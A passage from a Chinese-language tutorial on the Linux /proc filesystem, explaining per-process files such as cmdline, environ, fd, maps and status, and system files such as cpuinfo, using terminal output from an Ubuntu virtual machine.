2 0 14:03 ? 00:00:00 [md] root 131 2 0 14:03 ? 00:00:00 [edac-poller] root 132 2 0 14:03 ? 00:00:00 [devfreq_wq] root 133 2 0 14:03 ? 00:00:00 [watchdogd] root 136 2 0 14:03 ? 00:00:00 [kswapd0] root 269 2 0 14:03 ? 00:00:00 [kworker/0:1H-kblockd] root 272 2 0 14:03 ? 00:00:00 [kworker/1:1H-kblockd] root 292 2 0 14:03 ? 00:00:00 [jbd2/sda5-8] root 293 2 0 14:03 ? 00:00:00 [ext4-rsv-conver] root 332 1 0 14:03 ? 00:00:01 /lib/systemd/systemd-journald root 352 1 0 14:03 ? 00:00:01 /lib/systemd/systemd-udevd root 363 2 0 14:03 ? 00:00:00 [loop0] root 367 2 0 14:03 ? 00:00:00 [loop1] root 369 2 0 14:03 ? 00:00:00 [loop2] root 383 2 0 14:03 ? 00:00:00 [loop3] root 385 2 0 14:03 ? 00:00:00 [loop4] root 392 2 0 14:03 ? 00:00:00 [loop5] root 393 2 0 14:03 ? 00:00:00 [loop6] root 397 2 0 14:03 ? 00:00:00 [loop7] root 399 2 0 14:03 ? 00:00:00 [loop8] root 400 2 0 14:03 ? 00:00:00 [loop9] root 431 2 0 14:03 ? 00:00:00 [cryptd] systemd+ 596 1 0 14:03 ? 00:00:00 /lib/systemd/systemd-resolved systemd+ 597 1 0 14:03 ? 00:00:00 /lib/systemd/systemd-timesyncd root 628 1 0 14:03 ? 00:00:00 /usr/lib/accountsservice/accounts-daemon root 629 1 0 14:03 ? 00:00:00 /usr/sbin/acpid avahi 634 1 0 14:03 ? 00:00:14 avahi-daemon: running [parallels-Parallels-Virt root 636 1 0 14:03 ? 00:00:00 /usr/sbin/cron -f root 638 1 0 14:03 ? 00:00:16 /usr/sbin/cupsd -l message+ 639 1 0 14:03 ? 00:00:46 /usr/bin/dbus-daemon --system --address=systemd root 652 1 0 14:03 ? 00:00:00 /usr/sbin/irqbalance --foreground root 654 1 0 14:03 ? 00:00:00 /usr/bin/python3 /usr/bin/networkd-dispatcher - root 658 1 0 14:03 ? 00:00:05 /usr/lib/policykit-1/polkitd --no-debug syslog 665 1 0 14:03 ? 00:00:00 /usr/sbin/rsyslogd -n -iNONE root 670 1 0 14:03 ? 00:00:03 /usr/lib/snapd/snapd root 676 1 0 14:03 ? 00:00:00 /usr/libexec/switcheroo-control root 681 1 0 14:03 ? 00:00:00 /lib/systemd/systemd-logind root 682 1 0 14:03 ? 00:00:01 /usr/sbin/thermald --no-daemon --dbus-enable root 686 1 0 14:03 ? 00:00:00 /usr/lib/udisks2/udisksd root 687 1 0 14:03 ? 00:00:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplica avahi 701 634 0 14:03 ? 00:00:00 avahi-daemon: chroot helper colord 759 1 0 14:03 ? 00:00:00 /usr/libexec/colord root 771 1 0 14:03 ? 00:00:01 /usr/sbin/cups-browsed root 786 1 0 14:03 ? 00:00:00 /usr/sbin/ModemManager --filter-policy=strict root 793 1 0 14:03 ? 00:00:04 /usr/bin/prltoolsd -p /var/run/prltoolsd.pid root 826 1 0 14:03 ? 00:00:00 /usr/bin/python3 /usr/share/unattended-upgrades whoopsie 893 1 0 14:03 ? 00:00:00 /usr/bin/whoopsie -f kernoops 894 1 0 14:03 ? 00:00:00 /usr/sbin/kerneloops --test root 897 793 0 14:03 ? 00:00:06 prlshprint root 899 793 0 14:03 ? 00:00:00 prltimesync root 900 793 0 14:03 ? 00:00:00 prlusmd kernoops 903 1 0 14:03 ? 00:00:00 /usr/sbin/kerneloops root 908 1 0 14:03 ? 00:00:00 /usr/sbin/gdm3 rtkit 1208 1 0 14:03 ? 00:00:00 /usr/libexec/rtkit-daemon lp 1335 638 0 14:04 ? 00:00:00 /usr/lib/cups/notifier/dbus dbus:// root 1456 1 0 14:04 ? 00:00:01 /usr/lib/upower/upowerd root 1897 908 0 14:04 ? 00:00:00 gdm-session-worker [pam/gdm-password] paralle+ 1971 1 0 14:04 ? 00:00:00 /lib/systemd/systemd --user paralle+ 1972 1971 0 14:04 ? 00:00:00 (sd-pam) paralle+ 1978 1971 0 14:04 ? 00:00:00 /usr/bin/pulseaudio --daemonize=no --log-target paralle+ 1980 1971 0 14:04 ? 00:00:00 /usr/libexec/tracker-miner-fs paralle+ 1982 1971 0 14:04 ? 00:00:10 /usr/bin/dbus-daemon --session --address=system paralle+ 1989 1 0 14:04 ? 00:00:00 /usr/bin/gnome-keyring-daemon --daemonize --log paralle+ 2003 1971 0 14:04 ? 00:00:00 /usr/libexec/gvfsd paralle+ 2008 1971 0 14:04 ? 00:00:00 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f paralle+ 2009 1971 0 14:04 ? 00:00:00 /usr/libexec/gvfs-udisks2-volume-monitor paralle+ 2037 1971 0 14:04 ? 00:00:00 /usr/libexec/gvfs-goa-volume-monitor paralle+ 27969 3078 0 16:35 pts/0 00:00:00 ps -ef/proc 参考：https://www.cnblogs.com/liushui-sky/p/9354536.html\nLinux系统上的/proc目录是一种文件系统，即proc文件系统。\n其它常见的文件系统不同的是，/proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。\n为了查看及使用上的方便，这些文件通常会按照相关性进行分类存储于不同的目录甚至子目录中，如/proc/scsi目录中存储的就是当前系统上所有SCSI设备的相关信息，/proc/N中存储的则是系统当前正在运行的进程的相关信息，其中N为正在运行的进程（可以想象得到，在某进程结束后其相关目录则会消失）。\n大多数虚拟文件可以使用文件查看命令如cat、more或者less进行查看，有些文件信息表述的内容可以一目了然，但也有文件的信息却不怎么具有可读性。不过，这些可读性较差的文件在使用一些命令如apm、free、lspci或top查看时却可以有着不错的表现。\n查看当前系统进程 /proc目录中包含许多以数字命名的子目录，这些数字表示系统当前正在运行进程的进程号，里面包含对应进程相关的多个信息文件。\nll /proc上面列出的是/proc目录中一些进程相关的目录，每个目录中是当程本身相关信息的文件。\n/PID/cmdline （重点） cmdline — 启动当前进程的完整命令，但僵尸进程目录中的此文件不包含任何信息\n在启动时传递至内核的相关参数信息，这些信息通常由lilo或grub等启动管理工具进行传递；\n此处这里无法显示通过\u0026\u0026链接的执行的命令行串，无法用来查询由于\u0026\u0026命令行内容\nparallels@parallels-Parallels-Virtual-Platform:~$ cat /proc/47878/cmdline ping baidu.com/PID/cwd cwd — 指向当前进程运行目录的一个符号链接\nparallels@parallels-Parallels-Virtual-Platform:~$ sudo ls -l /proc/43828 | grep cwd lrwxrwxrwx 1 root root 0 May 31 14:10 cwd -\u003e /home/parallels/PID/environ（重点） environ — 当前进程的环境变量列表，彼此间用空字符（NULL）隔开；变量用大写字母表示，其值用小写字母表示\nparallels@parallels-Parallels-Virtual-Platform:~$ sudo cat /proc/47878/environ [sudo] password for parallels: SHELL=/bin/bashSESSION_MANAGER=local/parallels-Parallels-Virtual-Platform:@/tmp/.ICE-unix/2258,unix/parallels-Parallels-Virtual-Platform:/tmp/.ICE-unix/2258QT_ACCESSIBILITY=1COLORTERM=truecolorXDG_CONFIG_DIRS=/etc/xdg/xdg-ubuntu:/etc/xdgXDG_MENU_PREFIX=gnome-GNOME_DESKTOP_SESSION_ID=this-is-deprecatedGTK_IM_MODULE=ibusQT4_IM_MODULE=ibusGNOME_SHELL_SESSION_MODE=ubuntuSSH_AUTH_SOCK=/run/user/1000/keyring/sshXMODIFIERS=@im=ibusDESKTOP_SESSION=ubuntuSSH_AGENT_PID=2178GTK_MODULES=gail:atk-bridgePWD=/home/parallelsLOGNAME=parallelsXDG_SESSION_DESKTOP=ubuntuXDG_SESSION_TYPE=x11GPG_AGENT_INFO=/run/user/1000/gnupg/S.gpg-agent:0:1XAUTHORITY=/run/user/1000/gdm/XauthorityGJS_DEBUG_TOPICS=JS ERROR;JS LOGWINDOWPATH=2HOME=/home/parallelsUSERNAME=parallelsIM_CONFIG_PHASE=1LANG=en_US.UTF-8LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:XDG_CURRENT_DESKTOP=ubuntu:GNOMEVTE_VERSION=6003GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/efc7691e_62d3_4da5_9b04_42e49e7c22f4INVOCATION_ID=f08b7a60bc574e1fbfd6211389c8f72bMANAGERPID=1971CLUTTER_IM_MODULE=ibusGJS_DEBUG_OUTPUT=stderrLESSCLOSE=/usr/bin/lesspipe %s %sXDG_SESSION_CLASS=userTERM=xterm-256colorLESSOPEN=| /usr/bin/lesspipe %sUSER=parallelsGNOME_TERMINAL_SERVICE=:1.88DISPLAY=:0SHLVL=1QT_IM_MODULE=ibusXDG_RUNTIME_DIR=/run/user/1000JOURNAL_STREAM=9:39754XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share/:/usr/share/:/var/lib/snapd/desktopPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/binGDMSESSION=ubuntuDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus_=/usr/bin/ping/PID/exe（重点） exe — 指向启动当前进程的可执行文件（完整路径）的符号链接，通过/proc/N/exe可以启动当前进程的一个拷贝\nparallels@ubuntu:~$ sudo ls -l /proc/47878/ |grep exe lrwxrwxrwx 1 root root 0 May 31 14:36 exe -\u003e /usr/bin/ping/PID/fd（重点） fd — 这是个目录，包含当前进程打开的每一个文件的文件描述符（file descriptor），这些文件描述符是指向实际文件的一个符号链接\n程序1是运行vim .bash_history，模拟程序调用文件执行情况\nparallels@ubuntu:~$ vi .bash_history poweroff poweroff netstat -antlp apt install net-tools sudo apt install net-tools netstat -antlp netstat -l cat /etc/ hostnamectl set-hostname ubuntu uname uname -a ps ps -a cat /proc/43828/cmdline ps a cat /proc/47878/cmdline cat /proc/47878/environ sudo cat /proc/47878/environ uname -a netstat -i netstat -apu netstat -nu netstat -antlp通过fd/4可以看到，程序调用的文件的内容，但是里面的内容和原本被调用的文件中的内容存在一些差别，这里展示的行的顺序与源文件正好相反。这里只需要获取第一行～之后的文件目录地址即为程序所调用的文件。\nparallels@ubuntu:~$ sudo cat /proc/53421/fd/4 3210#\"! UtpTad��*arallelsubuntu~parallels/.bash_history � T��������jd[XR94��������xkhbXQIB:-'#� � � � � � � v ^ F - ) \u0026 � � � � � z c L * ) sudo ls -l /proc/43828 | grep cwdsudo ls -l /proc/43828sudo ls -a /proc/43828sudo ll /proc/43828sudo ls /proc/43828sudo ls /proc/43828 |grep cwdll /proc/43828 |grep cwdsudo ll /proc/43828 |grep cwdsudo /proc/43828/cwdsudo cat /proc/43828/cwdlspwdsudo pwd /proc/43828/cwdsudo ls /proc/43828/cwdsudo ll /proc/43828/cwdsudo pwd /proc/43828/cwdlssudo ls /proc/43828/cwdsudo /proc/43828/cwdsudo cat /proc/43828/cwdcat /proc/43828/cwdcat /proc/43874/cat /proc/43874/cwdcat /proc/43874 cat /proc/43874/cmdline cat /proc/3078/cmdline ll /proc/3078/cmdline ll /proc/3078ps all /proc/43874ll /procll /proc/43874ps apsapsmore /proc/2674/cmdlinell /proc/4ll /proc/3ll /proc/2ll /proc/1ll /procps -efps parallelsps rootps 2ps 1ps1ps(1)ps -aux USERps -auxps -aups -auxps auxps --helpps -hpsping 8.8.8.8ping baidu.comnetstat -lnetstat -snetstat -gnetstat -antlpnetstat -nunetstat -apunetstat -iuname -asudo cat /proc/47878/environ cat /proc/47878/environ cat /proc/47878/cmdline ps acat /proc/43828/cmdline ps -apsuname -aunamehostnamectl set-hostname ubuntucat /etc/netstat -lnetstat -antlpsudo apt install net-toolsapt install net-toolsnetstat -antlppoweroffpoweroff/PID/limits limits — 当前进程所使用的每一个受限资源的软限制、硬限制和管理单元；此文件仅可由实际启动当前进程的UID用户读取；（2.6.24以后的内核版本支持此功能）\nparallels@ubuntu:~$ sudo cat /proc/47878/limits Limit Soft Limit Hard Limit Units Max cpu time unlimited unlimited seconds Max file size unlimited unlimited bytes Max data size unlimited unlimited bytes Max stack size 8388608 unlimited bytes Max core file size 0 unlimited bytes Max resident set unlimited unlimited bytes Max processes 15497 15497 processes Max open files 1024 1048576 files Max locked memory 67108864 67108864 bytes Max address space unlimited unlimited bytes Max file locks unlimited unlimited locks Max pending signals 15497 15497 signals Max msgqueue size 819200 819200 bytes Max nice priority 0 0 Max realtime priority 0 0 Max realtime timeout unlimited unlimited us /PID/maps maps — 当前进程关联到的每个可执行文件和库文件在内存中的映射区域及其访问权限所组成的列表；\nparallels@ubuntu:~$ sudo cat /proc/47878/maps 559da3c7a000-559da3c7d000 r--p 00000000 08:05 2622362 /usr/bin/ping 559da3c7d000-559da3c87000 r-xp 00003000 08:05 2622362 /usr/bin/ping 559da3c87000-559da3c8b000 r--p 0000d000 08:05 2622362 /usr/bin/ping 559da3c8b000-559da3c8c000 r--p 00010000 08:05 2622362 /usr/bin/ping 559da3c8c000-559da3c8d000 rw-p 00011000 08:05 2622362 /usr/bin/ping 559da3c8d000-559da3cb0000 rw-p 00000000 00:00 0 559da49bd000-559da49de000 rw-p 00000000 00:00 0 [heap] 7f453ba5f000-7f453ba61000 r--p 00000000 08:05 2628055 /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so 7f453ba61000-7f453ba65000 r-xp 00002000 08:05 2628055 /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so 7f453ba65000-7f453ba66000 r--p 00006000 08:05 2628055 /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so 7f453ba66000-7f453ba67000 r--p 00006000 08:05 2628055 /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so 7f453ba67000-7f453ba68000 rw-p 00007000 08:05 2628055 /usr/lib/x86_64-linux-gnu/libnss_dns-2.31.so 7f453ba68000-7f453ba69000 r--p 00000000 08:05 2628063 /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2 7f453ba69000-7f453ba6b000 r-xp 00001000 08:05 2628063 /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2 7f453ba6b000-7f453ba6c000 r--p 00003000 08:05 2628063 /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2 7f453ba6c000-7f453ba6d000 r--p 00003000 08:05 2628063 /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2 7f453ba6d000-7f453ba6e000 rw-p 00004000 08:05 2628063 /usr/lib/x86_64-linux-gnu/libnss_mdns4_minimal.so.2 7f453ba6e000-7f453ba71000 r--p 00000000 08:05 2628057 /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so 7f453ba71000-7f453ba78000 r-xp 00003000 08:05 2628057 /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so 7f453ba78000-7f453ba7a000 r--p 0000a000 08:05 2628057 /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so 7f453ba7a000-7f453ba7b000 r--p 0000b000 08:05 2628057 /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so 7f453ba7b000-7f453ba7c000 rw-p 0000c000 08:05 2628057 /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so 7f453ba7c000-7f453ba82000 rw-p 00000000 00:00 0 7f453ba82000-7f453c860000 r--p 00000000 08:05 2626626 /usr/lib/locale/locale-archive 7f453c860000-7f453c862000 rw-p 00000000 00:00 0 7f453c862000-7f453c866000 r--p 00000000 08:05 2627669 /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0 7f453c866000-7f453c879000 r-xp 00004000 08:05 2627669 /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0 7f453c879000-7f453c883000 r--p 00017000 08:05 2627669 /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0 7f453c883000-7f453c884000 r--p 00020000 08:05 2627669 /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0 7f453c884000-7f453c885000 rw-p 00021000 08:05 2627669 /usr/lib/x86_64-linux-gnu/libgpg-error.so.0.28.0 7f453c885000-7f453c8aa000 r--p 00000000 08:05 2627295 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f453c8aa000-7f453ca22000 r-xp 00025000 08:05 2627295 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f453ca22000-7f453ca6c000 r--p 0019d000 08:05 2627295 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f453ca6c000-7f453ca6d000 ---p 001e7000 08:05 2627295 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f453ca6d000-7f453ca70000 r--p 001e7000 08:05 2627295 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f453ca70000-7f453ca73000 rw-p 001ea000 08:05 2627295 /usr/lib/x86_64-linux-gnu/libc-2.31.so 7f453ca73000-7f453ca77000 rw-p 00000000 00:00 0 7f453ca77000-7f453ca7b000 r--p 00000000 08:05 2628239 /usr/lib/x86_64-linux-gnu/libresolv-2.31.so 7f453ca7b000-7f453ca8b000 r-xp 00004000 08:05 2628239 /usr/lib/x86_64-linux-gnu/libresolv-2.31.so 7f453ca8b000-7f453ca8e000 r--p 00014000 08:05 2628239 /usr/lib/x86_64-linux-gnu/libresolv-2.31.so 7f453ca8e000-7f453ca8f000 ---p 00017000 08:05 2628239 /usr/lib/x86_64-linux-gnu/libresolv-2.31.so 7f453ca8f000-7f453ca90000 r--p 00017000 08:05 2628239 /usr/lib/x86_64-linux-gnu/libresolv-2.31.so 7f453ca90000-7f453ca91000 rw-p 00018000 08:05 2628239 /usr/lib/x86_64-linux-gnu/libresolv-2.31.so 7f453ca91000-7f453ca93000 rw-p 00000000 00:00 0 7f453ca93000-7f453ca9f000 r--p 00000000 08:05 2627593 /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5 7f453ca9f000-7f453cb6d000 r-xp 0000c000 08:05 2627593 /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5 7f453cb6d000-7f453cbaa000 r--p 000da000 08:05 2627593 /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5 7f453cbaa000-7f453cbac000 r--p 00116000 08:05 2627593 /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5 7f453cbac000-7f453cbb1000 rw-p 00118000 08:05 2627593 /usr/lib/x86_64-linux-gnu/libgcrypt.so.20.2.5 7f453cbb1000-7f453cbb3000 r--p 00000000 08:05 2627316 /usr/lib/x86_64-linux-gnu/libcap.so.2.32 7f453cbb3000-7f453cbb6000 r-xp 00002000 08:05 2627316 /usr/lib/x86_64-linux-gnu/libcap.so.2.32 7f453cbb6000-7f453cbb7000 r--p 00005000 08:05 2627316 /usr/lib/x86_64-linux-gnu/libcap.so.2.32 7f453cbb7000-7f453cbb8000 ---p 00006000 08:05 2627316 /usr/lib/x86_64-linux-gnu/libcap.so.2.32 7f453cbb8000-7f453cbb9000 r--p 00006000 08:05 2627316 /usr/lib/x86_64-linux-gnu/libcap.so.2.32 7f453cbb9000-7f453cbba000 rw-p 00007000 08:05 2627316 /usr/lib/x86_64-linux-gnu/libcap.so.2.32 7f453cbba000-7f453cbbc000 rw-p 00000000 00:00 0 7f453cbcd000-7f453cbce000 r--p 00000000 08:05 2627082 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f453cbce000-7f453cbf1000 r-xp 00001000 08:05 2627082 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f453cbf1000-7f453cbf9000 r--p 00024000 08:05 2627082 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f453cbfa000-7f453cbfb000 r--p 0002c000 08:05 2627082 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f453cbfb000-7f453cbfc000 rw-p 0002d000 08:05 2627082 /usr/lib/x86_64-linux-gnu/ld-2.31.so 7f453cbfc000-7f453cbfd000 rw-p 00000000 00:00 0 7ffecd650000-7ffecd671000 rw-p 00000000 00:00 0 [stack] 7ffecd7eb000-7ffecd7ee000 r--p 00000000 00:00 0 [vvar] 7ffecd7ee000-7ffecd7ef000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall]/PID/mem mem — 当前进程所占用的内存空间，由open、read和lseek等系统调用使用，不能被用户读取\nparallels@ubuntu:~$ sudo cat /proc/47878/mem cat: /proc/47878/mem: Input/output error/PID/root root — 指向当前进程运行根目录的符号链接；在Unix和Linux系统上，通常采用chroot命令使每个进程运行于独立的根目录\nparallels@ubuntu:~$ sudo ls -l /proc/47878/ |grep \"root -\" lrwxrwxrwx 1 root root 0 May 31 14:36 root -\u003e / 这里使用grep \"root -\"，是因为proc每一文件的归属用户也都是root，如下所示，不利于搜索 -r--r--r-- 1 root root 0 May 31 14:36 arch_status -rw-r--r-- 1 root root 0 May 31 14:36 autogroup -r-------- 1 root root 0 May 31 14:36 auxv -r--r--r-- 1 root root 0 May 31 14:36 cgroup --w------- 1 root root 0 May 31 14:36 clear_refs -r--r--r-- 1 root root 0 May 31 14:25 cmdline -rw-r--r-- 1 root root 0 May 31 14:36 comm/PID/stat stat — 当前进程的状态信息，包含一系统格式化后的数据列，可读性差，通常由ps命令使用\nparallels@ubuntu:~$ sudo cat /proc/47878/stat 47878 (ping) S 39281 47878 39281 34817 47878 4194304 160 0 0 0 42 208 0 0 20 0 1 0 1566795 18907136 710 18446744073709551615 94135545995264 94135546047281 140732344492352 0 0 0 0 0 8198 1 0 0 17 1 0 0 0 0 0 94135546067584 94135546069952 94135559901184 140732344501200 140732344501215 140732344501215 140732344504298 0/PID/statm statm — 当前进程占用内存的状态信息，通常以“页面”（page）表示\nparallels@ubuntu:~$ sudo cat /proc/47878/statm 4616 710 662 13 0 134 0/PID/status status — 与stat所提供信息类似，但可读性较好，如下所示，每行表示一个属性信息；其详细介绍请参见 proc的man手册页\nparallels@ubuntu:~$ sudo cat /proc/47878/status Name: ping Umask: 0002 State: S (sleeping) Tgid: 47878 Ngid: 0 Pid: 47878 PPid: 39281 TracerPid: 0 Uid: 1000 1000 1000 1000 Gid: 1000 1000 1000 1000 FDSize: 256 Groups: 4 24 27 30 46 120 131 132 1000 NStgid: 47878 NSpid: 47878 NSpgid: 47878 NSsid: 39281 VmPeak: 18532 kB VmSize: 18464 kB VmLck: 0 kB VmPin: 0 kB VmHWM: 2872 kB VmRSS: 2840 kB RssAnon: 192 kB RssFile: 2648 kB RssShmem: 0 kB VmData: 404 kB VmStk: 132 kB VmExe: 52 kB VmLib: 2664 kB VmPTE: 60 kB VmSwap: 0 kB HugetlbPages: 0 kB CoreDumping: 0 THP_enabled: 1 Threads: 1 SigQ: 0/15497 SigPnd: 0000000000000000 ShdPnd: 0000000000000000 SigBlk: 0000000000000000 SigIgn: 0000000000000000 SigCgt: 0000000000002006 CapInh: 0000000000000000 CapPrm: 0000000000002000 CapEff: 0000000000000000 CapBnd: 0000003fffffffff CapAmb: 0000000000000000 NoNewPrivs: 0 Seccomp: 0 Speculation_Store_Bypass: vulnerable Cpus_allowed: ffffffff Cpus_allowed_list: 0-31 Mems_allowed: 00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001 Mems_allowed_list: 0 voluntary_ctxt_switches: 9093 nonvoluntary_ctxt_switches: 7/PID/task（重点） task — 目录文件，包含由当前进程所运行的每一个线程的相关信息，每个线程的相关信息文件均保存在一个由线程号（tid）命名的目录中，这类似于其内容类似于每个进程目录中的内容；（内核2.6版本以后支持此功能）\n这里可以找一个python多线程程序测试，如下\n#!/usr/bin/python3 import _thread import time # 为线程定义一个函数 def print_time( threadName, delay): count = 0 while count \u003c 50: time.sleep(delay) count += 1 print (\"%s: %s\" % ( threadName, time.ctime(time.time()) )) # 创建两个线程 try: _thread.start_new_thread( print_time, (\"Thread-1\", 2, ) ) _thread.start_new_thread( print_time, (\"Thread-2\", 4, ) ) except: print (\"Error: 无法启动线程\") while 1: pass通过task可以看到\nparallels@ubuntu:~/Documents$ ls -l /proc/150666/task/ total 0 dr-xr-xr-x 7 parallels parallels 0 May 31 17:53 150666 dr-xr-xr-x 7 parallels parallels 0 May 31 17:53 150667 dr-xr-xr-x 7 parallels parallels 0 May 31 17:53 150668/apm apm — 高级电源管理（APM）版本信息及电池相关状态信息，通常由apm命令使用\nbuddyinfo — 用于诊断内存碎片问题的相关信息文件；\nparallels@ubuntu:~/Documents$ sudo cat /proc/buddyinfo Node 0, zone DMA 1 0 1 0 2 1 1 1 0 1 3 Node 0, zone DMA32 501 488 856 432 93 27 6 3 2 7 409 Node 0, zone Normal 62 28 23 36 160 41 10 4 4 0 0 /cpuinfo cpuinfo — 处理器的相关信息的文件；\nparallels@ubuntu:~/Documents$ sudo cat /proc/cpuinfo processor : 0 vendor_id : GenuineIntel cpu family : 6 model : 126 model name : Intel(R) Core(TM) i7-1068NG7 CPU @ 2.30GHz stepping : 5 cpu MHz : 2304.000 cache size : 8192 KB physical id : 0 siblings : 2 core id : 0 cpu cores : 2 apicid : 0 initial apicid : 0 fpu : yes fpu_exception : yes cpuid level : 22 wp : yes flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx rdtscp lm constant_tsc nopl xtopology nonstop_tsc cpuid tsc_known_freq pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid avx512f avx512dq rdseed adx smap clflushopt avx512cd avx512bw avx512vl xsaveopt xsavec dtherm arat pln pts bugs : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit bogomips : 4608.00 clflush size : 64 cache_alignment : 64 address sizes : 36 bits physical, 48 bits virtual power management: processor : 1 vendor_id : GenuineIntel cpu family : 6 model : 126 model name : Intel(R) Core(TM) i7-1068NG7 CPU @ 2.30GHz stepping : 5 cpu MHz : 2304.000 cache size : 8192 KB physical id : 0 siblings : 2 core id : 1 cpu cores : 2 apicid : 1 initial apicid : 1 fpu : yes fpu_exception : yes cpuid level : 22 wp : yes flags : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx rdtscp lm constant_tsc nopl xtopology nonstop_tsc cpuid tsc_known_freq pni pclmulqdq ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt tsc_deadline_timer aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti fsgsbase tsc_adjust bmi1 avx2 smep bmi2 invpcid avx512f avx512dq rdseed adx smap clflushopt avx512cd avx512bw avx512vl xsaveopt xsavec dtherm arat pln pts bugs : cpu_meltdown spectre_v1 spectre_v2 spec_store_bypass l1tf mds swapgs itlb_multihit bogomips : 4608.00 clflush size : 64 cache_alignment : 64 address sizes : 36 bits physical, 48 bits virtual power management:/crypto crypto — 系统上已安装的内核使用的密码算法及每个算法的详细信息列表；\nparallels@ubuntu:~/Documents$ sudo cat /proc/crypto name : crct10dif driver : crct10dif-pclmul module : crct10dif_pclmul priority : 200 refcnt : 2 selftest : passed internal : no type : shash blocksize : 1 digestsize : 2 name : ghash driver : ghash-clmulni module : ghash_clmulni_intel priority : 400 refcnt : 1 selftest 